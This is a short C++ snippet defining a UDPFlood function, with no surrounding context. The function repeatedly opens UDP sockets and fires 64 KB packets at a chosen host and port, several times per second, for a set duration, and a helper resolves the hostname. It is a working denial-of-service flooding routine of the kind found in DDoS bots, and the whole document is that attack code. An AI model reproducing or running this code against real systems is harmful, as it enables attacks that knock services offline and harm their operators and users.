```c++
void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c; 

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		c = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (c == 0) continue;
		sendto(c, dat, 65536, 0, (sockaddr*)&input, sizeof(input));
		sendto(c, dat, 65536, 0, (sockaddr*)&input, sizeof(input));
		closesocket(c);
		Sleep(10);
	}
}

// GetSocketAddress function to convert the given IP address and port number into sockaddr_in format
bool GetSocketAddress(char* address, sockaddr_in* result) {
	hostent* host = gethostbyname(address);
	if (host == nullptr) return false;
	memcpy(&result->sin_addr.s_addr, host->h_addr_list[0], host->h_length);
	result->sin_family = AF_INET;
	return true;
}
